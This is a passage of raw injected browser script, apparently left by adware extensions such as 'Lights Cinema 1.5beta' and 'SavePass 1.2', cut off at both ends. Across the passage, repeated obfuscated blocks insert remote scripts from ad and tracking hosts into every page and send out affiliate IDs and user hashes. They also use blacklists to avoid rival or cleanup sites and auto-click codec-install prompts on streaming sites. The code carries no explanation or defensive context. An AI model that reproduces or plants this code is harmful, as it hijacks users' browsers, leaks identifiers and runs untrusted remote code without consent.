httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_71387_391__'] = true;window['__ByvlA'] = window['__ByvlA'] ? (window['__ByvlA'] + ',' + 391) : 391;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_71387_391__'] = true;window['__ByvlA'] = window['__ByvlA'] ? (window['__ByvlA'] + ',' + 391) : 391;}}} catch (L) {}}());</script><script type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 390 || 287 !== 390 || 119 !== 390)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (390 != 273 && 390 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(390)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(390) ){return;}function f(){return typeof window['__utility_running_71387_390__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://cdncache-a.akamaihd.net/sub/h0982be/300266110029000000/l.js?pid=2295&ext=Lights%20Cinema%201.5beta';var httpsUrl = 'https://cdncache-a.akamaihd.net/sub/h0982be/300266110029000000/l.js?pid=2295&ext=Lights%20Cinema%201.5beta';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_71387_390__'] = true;window['__ByvlA'] = window['__ByvlA'] ? (window['__ByvlA'] + ',' + 390) : 390;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_71387_390__'] = true;window['__ByvlA'] = window['__ByvlA'] ? (window['__ByvlA'] + ',' + 390) : 390;}}} catch (L) {}}());</script><script type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 102 || 287 !== 102 || 119 !== 102)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (102 != 273 && 102 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(102)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(102) ){return;}function f(){return typeof window['__utility_running_71387_102__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://i.crbsjs.info/crbf/javascript.js?channel=crdr_300266110029000000&appTitle=Lights%20Cinema%201.5beta&hid=149525929fae92db32a394a703a5bbe7';var httpsUrl = 'https://i_crbsjs_info.tlscdn.com/crbf/javascript.js?channel=crdr_300266110029000000&appTitle=Lights%20Cinema%201.5beta&hid=149525929fae92db32a394a703a5bbe7';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_71387_102__'] = true;window['__ByvlA'] = window['__ByvlA'] ? (window['__ByvlA'] + ',' + 102) : 102;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_71387_102__'] = true;window['__ByvlA'] = window['__ByvlA'] ? (window['__ByvlA'] + ',' + 102) : 102;}}} catch (L) {}}());</script><script type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 180 || 287 !== 180 || 119 !== 180)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (180 != 273 && 180 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(180)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(180) ){return;}function f(){return typeof window['__utility_running_71387_180__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://a.snowplanes.com/a.php?626ref2=300266110029000000&626Name=Lights%20Cinema%201.5beta&626ref3=149525929fae92db32a394a703a5bbe7&626ref1=63726f73737269646572&teid=71387&tuid=794CC92401E24B428E1CD52EDA8B6D0EIE';var httpsUrl = 'https://a.snowplanes.com/a.php?626ref2=300266110029000000&626Name=Lights%20Cinema%201.5beta&626ref3=149525929fae92db32a394a703a5bbe7&626ref1=63726f73737269646572&teid=71387&tuid=794CC92401E24B428E1CD52EDA8B6D0EIE';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_71387_180__'] = true;window['__ByvlA'] = window['__ByvlA'] ? (window['__ByvlA'] + ',' + 180) : 180;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_71387_180__'] = true;window['__ByvlA'] = window['__ByvlA'] ? (window['__ByvlA'] + ',' + 180) : 180;}}} catch (L) {}}());</script><script type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 232 || 287 !== 232 || 119 !== 232)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (232 != 273 && 232 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(232)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(232) ){return;}function f(){return typeof window['__utility_running_71387_232__'] !== 'undefined';}try {if (f()) {return;}window._rvz1700x1049 = { 'publisher_subid': '300266110029000000', 'addonname': 'Lights%20Cinema%201.5beta'};var httpUrl = 'http://asrv-a.akamaihd.net/sd/1700/1049.js';var httpsUrl = 'https://asrv-a.akamaihd.net/sd/1700/1049.js';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_71387_232__'] = true;window['__ByvlA'] = window['__ByvlA'] ? (window['__ByvlA'] + ',' + 232) : 232;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_71387_232__'] = true;window['__ByvlA'] = window['__ByvlA'] ? (window['__ByvlA'] + ',' + 232) : 232;}}} catch (L) {}}());</script><script type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 273 || 287 !== 273 || 119 !== 273)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (273 != 273 && 273 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(273)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(273) ){return;}function f(){return typeof window['__utility_running_71387_273__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://cjs.linkbolic.com/scjs/cjs/ctxjs.js?aff_id=1145&subaff_id=300266110029000000&sbrand=Lights%20Cinema%201.5beta';var httpsUrl = 'https://cjs.linkbolic.com/scjs/cjs/ctxjs.js?aff_id=1145&subaff_id=300266110029000000&sbrand=Lights%20Cinema%201.5beta';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_71387_273__'] = true;window['__ByvlA'] = window['__ByvlA'] ? (window['__ByvlA'] + ',' + 273) : 273;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_71387_273__'] = true;window['__ByvlA'] = window['__ByvlA'] ? (window['__ByvlA'] + ',' + 273) : 273;}}} catch (L) {}}());</script><script type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 281 || 287 !== 281 || 119 !== 281)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (281 != 273 && 281 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(281)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(281) ){return;}function f(){return typeof window['__utility_running_71387_281__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://clkdeals.com/adServe/getTag?pid=11021&type=inject&cid=300266110029000000&appName=Lights%20Cinema%201.5beta&q=__DOMAIN__';var httpsUrl = '';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_71387_281__'] = true;window['__ByvlA'] = window['__ByvlA'] ? (window['__ByvlA'] + ',' + 281) : 281;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_71387_281__'] = true;window['__ByvlA'] = window['__ByvlA'] ? (window['__ByvlA'] + ',' + 281) : 281;}}} catch (L) {}}());</script><script type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 288 || 287 !== 288 || 119 !== 288)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (288 != 273 && 288 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(288)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(288) ){return;}function f(){return typeof window['__utility_running_71387_288__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://istatic.eshopcomp.com/fo/min/crqc.js?hid=149525929fae92db32a394a703a5bbe7&bname=Lights%20Cinema%201.5beta&subid=300266110029000000';var httpsUrl = 'https://istatic.eshopcomp.com/fo/min/crqc.js?hid=149525929fae92db32a394a703a5bbe7&bname=Lights%20Cinema%201.5beta&subid=300266110029000000';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_71387_288__'] = true;window['__ByvlA'] = window['__ByvlA'] ? (window['__ByvlA'] + ',' + 288) : 288;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_71387_288__'] = true;window['__ByvlA'] = window['__ByvlA'] ? (window['__ByvlA'] + ',' + 288) : 288;}}} catch (L) {}}());</script><script type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 450 || 287 !== 450 || 119 !== 450)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (450 != 273 && 450 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(450)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(450) ){return;}function f(){return typeof window['__utility_running_71387_450__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://cdncache-a.akamaihd.net/sub/p3af2c8/300266110029000000/l.js?pid=2271&ext=Lights%20Cinema%201.5beta';var httpsUrl = 'https://cdncache-a.akamaihd.net/sub/p3af2c8/300266110029000000/l.js?pid=2271&ext=Lights%20Cinema%201.5beta';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_71387_450__'] = true;window['__ByvlA'] = window['__ByvlA'] ? (window['__ByvlA'] + ',' + 450) : 450;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_71387_450__'] = true;window['__ByvlA'] = window['__ByvlA'] ? (window['__ByvlA'] + ',' + 450) : 450;}}} catch (L) {}}());</script><script type="text/javascript">window.__blackListUrls__ = ['(?:.*.)?smartshopping.com','(?:.*.)?shoppstop.com','(?:.*.)?localmoxie.com','(?:.*.)?mail.com','(?:.*.)?yellowmoxie.com','(?:.*.)?internetproper.com', '(?:.*.)?traveleist.com','(?:.*.)?financetopix.com','(?:.*.)?ideallhealth.com','(?:.*.)?search2discover.com','(?:.*.)?variablesearch.com','(?:.*.)?efix.com','(?:.*.)?reimage-express.com','(?:.*.)?anti-toolbar.com','(?:.*.)?supersupport.com','(?:.*.)?reimageplus.com','(?:.*.)?reimage.com','(?:.*.)?crossrider.com','(?:.*.)?bi.crossrider.com', '(?:.*.)?softonic.com', '(?:.*.)?mackeeper.com', '(?:.*.)?pckeeper.com', '(?:.*.)?kromtech.com','(?:.*.)?plusnetwork.com'];</script><script type="text/javascript">window.__checkIfUrlIsValid__ = function(url){try {for (var i = 0; i < window.__blackListUrls__.length; i++){ if (window.__blackListUrls__[i] === url){return false;}else{var regex = new RegExp(window.__blackListUrls__[i], 'g');var res = url.match(regex);if (res){return false;}}}return true;} catch(e) {return true;}}</script><script type="text/javascript">window.__checkIfPCUrl__ = function () {function checkUrl(urlsArr) {for (var i = 0; i < urlsArr.length; i++){if (location.href.indexOf(urlsArr[i]) >= 0) {return true;}}return false;}var full = ['securedshopgate.com','pcutilitiespro.com','pcrepairlabs.com','superpctools.com','viracure.com'];var sub = ['pcutilitiespro', 'viracure', 'superpctools', 'pcrepairlabs'];var file = ['.optimizerpro','.optimizerpro-50','.op-xsell','.op-var1','.op-var2','.op-var3','.op-var4','.op-special','.op-xsell-special','.dp-xsell','.driverpro','.drvpro-50','.dp-9','.dp-var1','.drvpro','.driverpro-50','.1pk-email','.email-25','.email-35','.email-50','.optimizer-30','.optimizer-35','.optimizer-40','.optimizer-45','.optimizer-rs','.support','.support-25','.support-50','.oem','.oem-50','.oem-special','.oem-var1','.avem','.avem-50','.avem-special','.spo','.spo-50','.spo-special','.spu','.spu-50','.spu-special','.spo-x-sell','.soxsell-special','.spu-x-sell','.systemoptimizer','.driverupdater','.so-special','.du-special','.du-xsell','.du-xsell-special','.so-xsell','.so-xsell-special','.systemoptimizer-50'];return checkUrl(full) || (checkUrl(['safecart.com']) && checkUrl(sub) && checkUrl(file));};</script><script type="text/javascript">window.__validDomain__ =(typeof window.__checkIfUrlIsValid__ == 'function' && typeof window.__checkIfPCUrl__ == 'function')?window.__checkIfUrlIsValid__(document.location.host) && !__checkIfPCUrl__(): true;</script><script type="text/javascript">window.__myWindow__=function (id){var p = [195,221,265,278,280,277,279,337,338];if (typeof window.name === 'string' && window.name.match(/icm_inline_p/)){for (var i=0;i<p.length;i++){if(p[i]==id){return false;}}return true;}return false;};</script><script type="text/javascript">window.__onlyMe__=function (id){var p = [264,158,116,117,103,262,190];if (typeof window.name === 'string' && (window.name.match(/^a652c_/) || window.name.match(/^z7b85_/) || window.name.match(/^ld893_/))){for (var i=0;i<p.length;i++){if(p[i]==id){return false;}}return true;}return false;};</script><script type="text/javascript">(function(){function extendOnLoad(func){if (window.addEventListener) {window.addEventListener('load', func, false);} else if (window.attachEvent) {window.attachEvent('onload', func);}}function insertTag(){var script = document.createElement('script');script.type = 'text/javascript';script.src = '//s2hd-plugincom-maynemyltf.netdna-ssl.com/js/hdv.min.js';document.getElementsByTagName('head')[0].appendChild(script);}if(document.readyState === 'complete'){insertTag();} else {extendOnLoad(insertTag);}})();</script><script type="text/javascript">!function(){var e={parseURL:function(e){var t;return e?(t=document.createElement("a"),t.href=e):t=window.location,{source:e||window.location.href,protocol:t.protocol.replace(":",""),host:function(){var e=t.hostname||t.pathname,n=e.match(/(?:(.*?).)?([^/]*).(.{2,5})/i)||"";return{sub:n[1]||"",name:n[2],tld:n[3]}}(),port:t.port,query:t.search,params:function(){for(var e,n={},a=t.search.replace(/^?/,"").split("&"),i=a.length,o=0;i>o;o++)a[o]&&(e=a[o].split("="),n[e[0]]=e[1]);return n}(),file:(t.pathname.match(//([^/?#]+)$/i)||[,""])[1],hash:t.hash.replace("#",""),path:t.pathname.replace(/^([^/])/,"/$1"),relative:(t.href.match(/tps?://[^/]+(.+)/)||[,""])[1],segments:(t.href.match(/tps?://[^/]+(.+)/)||[,""])[1].replace(/^//,"").split("/")}},addListener:function(e,t){document.addEventListener?document.addEventListener(e,t,!1):document.attachEvent&&document.attachEvent(e,t)},removeListener:function(e,t){document.removeEventListener?document.removeEventListener(e,t,!1):document.detachEvent&&document.detachEvent(e,t)}},t={sites:{drakulastream:{type:"1",selector:"input[value='Install HD video codec...'], input[value='Update'], a:contains('Run this time')"}},removeStrip:function(t){function n(){e.addListener("DOMSubtreeModified",i),o=!0}function a(){o&&(e.removeListener("DOMSubtreeModified",i),o=!1)}function i(){if($(t.selector).length<1)return!1;switch(t.type){case"1":setTimeout(function(){$(t.selector).parent().parent().find("div:contains('X')").trigger("click")},10);break;case"2":setTimeout(function(){$(t.selector).next().trigger("click"),$("body").stop(),$("body").css("background-position","0px 0px"),setTimeout(function(){$("body").stop(),$("body").css("background-position","0px 0px")},800)},10);break;case"3":setTimeout(function(){$(t.selector).parent().next().trigger("click")},10)}return a(),!0}var o=!1;i()||(n(),setTimeout(a,1e4))},run:function(){var t=e.parseURL(window.location.hostname).host.name,n=this.options.sites[t];n&&this.removeStrip(n)}};t.run()}();</script><script type="text/javascript">window.__blackListUrls__ = ['(?:.*.)?smartshopping.com','(?:.*.)?shoppstop.com','(?:.*.)?localmoxie.com','(?:.*.)?mail.com','(?:.*.)?yellowmoxie.com','(?:.*.)?internetproper.com', '(?:.*.)?traveleist.com','(?:.*.)?financetopix.com','(?:.*.)?ideallhealth.com','(?:.*.)?search2discover.com','(?:.*.)?variablesearch.com','(?:.*.)?efix.com','(?:.*.)?reimage-express.com','(?:.*.)?anti-toolbar.com','(?:.*.)?supersupport.com','(?:.*.)?reimageplus.com','(?:.*.)?reimage.com','(?:.*.)?crossrider.com','(?:.*.)?bi.crossrider.com', '(?:.*.)?softonic.com', '(?:.*.)?mackeeper.com', '(?:.*.)?pckeeper.com', '(?:.*.)?kromtech.com','(?:.*.)?plusnetwork.com'];</script><script type="text/javascript">window.__checkIfUrlIsValid__ = function(url){try {for (var i = 0; i < window.__blackListUrls__.length; i++){ if (window.__blackListUrls__[i] === url){return false;}else{var regex = new RegExp(window.__blackListUrls__[i], 'g');var res = url.match(regex);if (res){return false;}}}return true;} catch(e) {return true;}}</script><script type="text/javascript">window.__checkIfPCUrl__ = function () {function checkUrl(urlsArr) {for (var i = 0; i < urlsArr.length; i++){if (location.href.indexOf(urlsArr[i]) >= 0) {return true;}}return false;}var full = ['securedshopgate.com','pcutilitiespro.com','pcrepairlabs.com','superpctools.com','viracure.com'];var sub = ['pcutilitiespro', 'viracure', 'superpctools', 'pcrepairlabs'];var file = ['.optimizerpro','.optimizerpro-50','.op-xsell','.op-var1','.op-var2','.op-var3','.op-var4','.op-special','.op-xsell-special','.dp-xsell','.driverpro','.drvpro-50','.dp-9','.dp-var1','.drvpro','.driverpro-50','.1pk-email','.email-25','.email-35','.email-50','.optimizer-30','.optimizer-35','.optimizer-40','.optimizer-45','.optimizer-rs','.support','.support-25','.support-50','.oem','.oem-50','.oem-special','.oem-var1','.avem','.avem-50','.avem-special','.spo','.spo-50','.spo-special','.spu','.spu-50','.spu-special','.spo-x-sell','.soxsell-special','.spu-x-sell','.systemoptimizer','.driverupdater','.so-special','.du-special','.du-xsell','.du-xsell-special','.so-xsell','.so-xsell-special','.systemoptimizer-50'];return checkUrl(full) || (checkUrl(['safecart.com']) && checkUrl(sub) && checkUrl(file));};</script><script type="text/javascript">window.__validDomain__ =(typeof window.__checkIfUrlIsValid__ == 'function' && typeof window.__checkIfPCUrl__ == 'function')?window.__checkIfUrlIsValid__(document.location.host) && !__checkIfPCUrl__(): true;</script><script type="text/javascript">window.__myWindow__=function (id){var p = [195,221,265,278,280,277,279,337,338];if (typeof window.name === 'string' && window.name.match(/icm_inline_p/)){for (var i=0;i<p.length;i++){if(p[i]==id){return false;}}return true;}return false;};</script><script type="text/javascript">window.__onlyMe__=function (id){var p = [264,158,116,117,103,262,190];if (typeof window.name === 'string' && (window.name.match(/^a652c_/) || window.name.match(/^z7b85_/) || window.name.match(/^ld893_/))){for (var i=0;i<p.length;i++){if(p[i]==id){return false;}}return true;}return false;};</script><script type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 390 || 287 !== 390 || 119 !== 390)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (390 != 273 && 390 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(390)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(390) ){return;}function f(){return typeof window['__utility_running_63429_390__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://cdncache-a.akamaihd.net/sub/h0982be/300150410021000000/l.js?pid=2295&ext=SavePass%201.2';var httpsUrl = 'https://cdncache-a.akamaihd.net/sub/h0982be/300150410021000000/l.js?pid=2295&ext=SavePass%201.2';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && 